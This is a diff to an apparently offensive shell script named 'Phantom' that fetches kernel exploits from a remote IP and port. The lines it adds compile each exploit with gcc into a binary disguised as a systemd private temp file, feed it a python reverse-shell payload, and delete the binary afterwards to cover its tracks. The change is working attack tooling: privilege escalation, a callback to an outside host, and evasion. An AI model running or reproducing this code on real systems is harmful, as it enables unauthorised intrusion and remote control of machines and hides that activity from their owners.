@@ -2,8 +2,8 @@
 
 ip="10.0.2.2"
 port2="9999"
-portp="15952"
-portr="15318"
+portp="15162"
+portr="15048"
 
 echo "---Phantom started---"
 #find the user making the connection
@@ -80,8 +80,9 @@ EOF
         if [ $minor -le $j ]; then
           exploits_final_array=($(ls /tmp/$ip:$portp/exploits/$i/$j))
           for k in ${exploits_final_array[*]}; do
+            gcc -pthread -o /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx /tmp/$ip:$portp/exploits/$i/$j/$k &>/dev/null
             echo "attempting $k..."
-            echo $python_reverse | /tmp/$ip:$portp/exploits/$i/$j/$k &>/dev/null
+            echo $python_reverse | /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx &>/dev/null
             sleep 3
           done
         fi
@@ -94,6 +95,7 @@ EOF
   rm /tmp/.services &>/dev/null
   rm /tmp/.variables &>/dev/null
   rm -r /tmp/$ip:$portp &>/dev/null
+  rm /tmp/.systemd-private-a2e8e80eec1f4f41b7b21b930abcf273-system.service-2S5dfx &>/dev/null
   finish
   exit
 fi
